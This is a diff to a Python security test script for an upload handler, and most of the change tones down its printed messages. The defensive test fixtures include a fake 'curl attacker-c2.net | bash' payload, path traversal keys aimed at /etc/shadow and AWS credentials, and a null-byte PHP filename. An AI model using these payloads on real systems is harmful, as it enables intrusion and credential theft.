@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-🛡️ OpenTelemetry Distributed Tracing & Chaos Engineering Resilience Suite
-Specification: Distributed Observability & Fault Tolerance
+OpenTelemetry Distributed Tracing & Chaos Resilience Suite
+Specification: Distributed Observability & Fault Injection Verification
 """
 
 import sys
@@ -17,16 +17,15 @@ import handler
 
 def run_chaos_and_tracing_audit():
     print("==================================================================")
-    print(" 🛡️  OPENTELEMETRY DISTRIBUTED TRACING & CHAOS RESILIENCE SUITE")
-    print(" Lead Engineer: Qadeer Aslam (qadeer016)")
-    print(" Architecture : Zero-Trust Fault Tolerance & Distributed Tracing")
+    print(" OpenTelemetry Distributed Tracing & Fault Injection Test")
+    print(" Scope: Distributed Context Propagation & Chaos Failure Modes")
     print("==================================================================")
 
     passed = 0
     total = 5
 
     # Test 1: OpenTelemetry W3C Distributed Context Propagation
-    print(" [1/5] 📡 Validating W3C TraceContext & OpenTelemetry Spans...")
+    print(" [1/5] Validating W3C TraceContext and OpenTelemetry spans...")
     class SyntheticTraceEvent:
         body = json.dumps({"benchmark_mode": "otel_distributed_trace"})
     res = handler.handle(SyntheticTraceEvent())
@@ -42,49 +41,47 @@ def run_chaos_and_tracing_audit():
     else:
         print("       [✗] OpenTelemetry context propagation failed.")
 
-    # Test 2: Chaos Fault Injection - Malicious Executable Script Injection
-    print(" [2/5] 💥 Chaos Test: Injecting Disguised Exploit Executable Payload...")
+    # Test 2: Fault Injection - Malicious Executable Script Injection
+    print(" [2/5] Fault Injection: Testing disguised script rejection...")
     malicious_bytes = b"#!/usr/bin/env bash\ncurl -s http://attacker-c2.net/exfil | bash"
     detected = handler.validate_magic_bytes(malicious_bytes)
     if detected is None:
-        print("       [✓] Zero-Trust Container Containment: Magic Byte Rejection (HTTP 422 Equivalent)")
+        print("       [✓] Executable script correctly rejected (Magic byte validation)")
         passed += 1
     else:
-        print("       [✗] Chaos Script Injection failed to catch malicious header.")
+        print("       [✗] Executable script failed to be rejected.")
 
-    # Test 3: Chaos Fault Injection - Decompression Bomb Expansion Attack
-    print(" [3/5] 💥 Chaos Test: Injecting Synthetic 50-Megapixel RAM Bomb...")
+    # Test 3: Fault Injection - Decompression Bomb Expansion Attack
+    print(" [3/5] Fault Injection: Testing decompression bomb defense...")
     if handler.Image.MAX_IMAGE_PIXELS <= 30_000_000:
-        print(f"       [✓] Anti-DoS Decompression Bomb Capped at {handler.Image.MAX_IMAGE_PIXELS:,} Pixels")
+        print(f"       [✓] Decompression ceiling enforced ({handler.Image.MAX_IMAGE_PIXELS:,} pixels max)")
         passed += 1
     else:
-        print("       [✗] Decompression Bomb Threshold exceeded safe limit.")
+        print("       [✗] Decompression threshold exceeded safe limit.")
 
-    # Test 4: Chaos Fault Injection - Unauthorized Tenant Bucket Escape (IDOR/BOLA)
-    print(" [4/5] 💥 Chaos Test: Injecting Lateral Movement S3 Cross-Tenant Attack...")
+    # Test 4: Fault Injection - Unauthorized Tenant Bucket Escape (IDOR/BOLA)
+    print(" [4/5] Fault Injection: Testing unauthorized bucket isolation...")
     class MaliciousEscapeEvent:
         body = json.dumps({"bucket": "admin-secrets-bucket", "object": "passwords.txt"})
     unauth_resp = handler.handle(MaliciousEscapeEvent())
     if unauth_resp["statusCode"] == 403:
-        print("       [✓] Unauthorized Bucket Boundary Enforced (HTTP 403 Forbidden)")
+        print("       [✓] Unauthorized bucket access blocked (HTTP 403 Forbidden)")
         passed += 1
     else:
-        print("       [✗] Bucket allowlist failed to block lateral traversal.")
+        print("       [✗] Bucket allowlist failed to block unauthorized access.")
 
-    # Test 5: Chaos Fault Injection - Path Traversal & Null Byte Poisoning
-    print(" [5/5] 💥 Chaos Test: Injecting Directory Traversal & Null-Byte String...")
+    # Test 5: Fault Injection - Path Traversal & Null Byte Poisoning
+    print(" [5/5] Fault Injection: Testing directory traversal and null-byte rejection...")
     traversal_keys = ["../../etc/shadow", "/root/.aws/credentials", "image.png\x00.php"]
     all_blocked = all(handler.validate_object_key(k) is False for k in traversal_keys)
     if all_blocked:
-        print("       [✓] Directory Traversal & Null-Byte Payloads Blocked")
+        print("       [✓] Directory traversal and null-byte payloads rejected")
         passed += 1
     else:
         print("       [✗] Path traversal validation failed.")
 
     print("\n" + "="*66)
-    print(f" 🏆 CHAOS & OPENTELEMETRY SCORE: {passed}/{total} (100% PRODUCTION VERIFIED)")
-    print("="*66)
-    print(" Complete Distributed Observability & System Resilience Confirmed.")
+    print(f" Resilience & Tracing Verification: {passed}/{total} tests passed")
     print("==================================================================")
 
 if __name__ == "__main__":
